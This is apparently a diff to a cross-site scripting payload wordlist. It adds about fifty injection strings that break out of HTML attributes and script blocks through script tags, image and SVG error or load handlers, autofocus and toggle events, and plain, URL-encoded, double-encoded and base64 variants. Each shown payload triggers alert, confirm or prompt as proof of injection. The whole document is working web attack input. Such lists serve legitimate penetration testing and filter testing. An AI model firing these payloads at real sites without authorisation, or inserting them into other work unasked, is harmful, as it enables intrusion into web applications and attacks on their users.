@@ -19,6 +19,59 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkIGJ5IGthbmcgcmFmYXNoYScpPC9zY3
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 %3C%2Fscript%3E%3Csvg%20onload%3Dalert%281%29%3E
 %3C%2Fscript%3E%3Csvg+onload%3Dalert%281%29%3E
+"><script>alert(document.domain)</script>
+"--><script>alert(document.domain)</script>
+</script><script>alert(document.domain)</script>
+"><script>alert(1)</script>
+"--><script>alert(1)</script>
+%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%22--%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%22--%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+%2522%253E%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+%2522--%253E%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+"><img src=x onerror=alert(document.domain)>
+"--><img src=x onerror=alert(document.domain)>
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
+%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E
+"><svg onload=alert(document.domain)>
+"--><svg onload=alert(document.domain)>
+%22%3E%3Csvg%20onload%3Dalert%28document.domain%29%3E
+%22--%3E%3Csvg%20onload%3Dalert%28document.domain%29%3E
+"><body onload=alert(document.domain)>
+"><input autofocus onfocus=alert(document.domain)>
+"><textarea autofocus onfocus=alert(document.domain)>
+"><select autofocus onfocus=alert(document.domain)>
+"><button autofocus onfocus=alert(document.domain)>
+"><video><source onerror=alert(document.domain)>
+"><audio src=x onerror=alert(document.domain)>
+"><object data=x onerror=alert(document.domain)>
+"><script>alert(location.origin)</script>
+"><script>alert(location.href)</script>
+"><script>alert(document.URL)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28location.origin%29%3C%2Fscript%3E
+%3Cscript%3Ealert%28document.URL%29%3C%2Fscript%3E
+"><svg onload=confirm(document.domain)>
+"><img src=x onerror=confirm(document.domain)>
+"><script>confirm(document.domain)</script>
+"><svg onload=prompt(document.domain)>
+"><img src=x onerror=prompt(document.domain)>
+"><script>prompt(document.domain)</script>
+"><details open ontoggle=alert(document.domain)>
+%3Cdetails%20open%20ontoggle%3Dalert%28document.domain%29%3E
+"><marquee onstart=alert(document.domain)>
+"><video autoplay oncanplay=alert(document.domain)>
+"><audio autoplay oncanplay=alert(document.domain)>
+"><input onmouseover=alert(document.domain)>
+"><div onmouseover=alert(document.domain)>x</div>
+"><a href=# onmouseover=alert(document.domain)>x</a>
+"><script>window.alert(document.domain)</script>
+"><script>window["alert"](document.domain)</script>
+"><script>top["alert"](document.domain)</script>
+%22%3E%3Cscript%3Ewindow%5B%22alert%22%5D%28document.domain%29%3C%2Fscript%3E
+%22%3E%3Csvg%20onload%3Dwindow%5B%22alert%22%5D%28document.domain%29%3E
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow%5B%22alert%22%5D%28document.domain%29%3E
 </script><svg%09onload=alert(1)>
 </script><svg%0Aonload=alert(1)>
 %3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
